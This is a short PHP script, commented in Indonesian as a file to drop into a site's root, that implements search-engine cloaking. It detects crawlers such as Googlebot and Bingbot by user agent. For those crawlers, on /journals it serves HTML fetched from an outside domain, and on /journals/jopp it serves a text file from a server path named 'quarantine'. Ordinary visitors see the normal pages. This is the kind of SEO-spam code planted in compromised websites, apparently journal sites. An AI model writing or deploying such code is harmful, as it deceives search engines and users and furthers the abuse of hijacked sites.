// Simpan sebagai cloak.php di root
function is_google_bot(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'] ?? '', $b) !== false) return true;
    }
    return false;
}

$request_uri = $_SERVER['REQUEST_URI'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Cloaking level 1: /journals
if($request_uri == '/journals' && is_google_bot()){
    $content = @file_get_contents('https://freeportindonesia.org/landing/ijsse.html');
    if($content) {
        echo $content;
        exit;
    }
}

// Cloaking level 2: /journals/jopp
if(strpos($request_uri, '/journals/jopp') !== false){
    $is_bot = false;
    $bots = ['Googlebot', 'Google-InspectionTool', 'Bingbot', 'Slurp', 'DuckDuckBot'];
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            $is_bot = true;
            break;
        }
    }
    
    if ($is_bot){
        $file = '/home/u457839213/quarantine/jopp.txt';
        if (file_exists($file) && is_readable($file)) {
            header('Content-Type: text/plain');
            readfile($file);
        } else {
            http_response_code(404);
            echo 'cache not ready';
        }
        exit;
    }
}
